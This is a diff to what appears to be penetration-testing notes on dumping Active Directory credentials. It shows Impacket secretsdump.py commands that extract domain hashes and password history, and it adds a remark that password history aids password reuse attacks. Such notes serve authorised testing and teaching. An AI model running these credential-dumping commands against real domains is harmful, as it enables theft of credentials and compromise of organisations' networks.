@@ -7,7 +7,7 @@ If you have creds for the backup account for domain controller: can dump all has
 
     python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup:backuppassword@domain.local
     
-Use secretsdump.py to dump hashes and hash history from Active Directory database (NTDS.dit) and the SYSTEM registry hive:      
+Use secretsdump.py to dump hashes and hash history from Active Directory database (NTDS.dit) and the SYSTEM registry hive. Password history can be helpful for password reuse attacks.            
 
     python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile dc-hashes -history
     
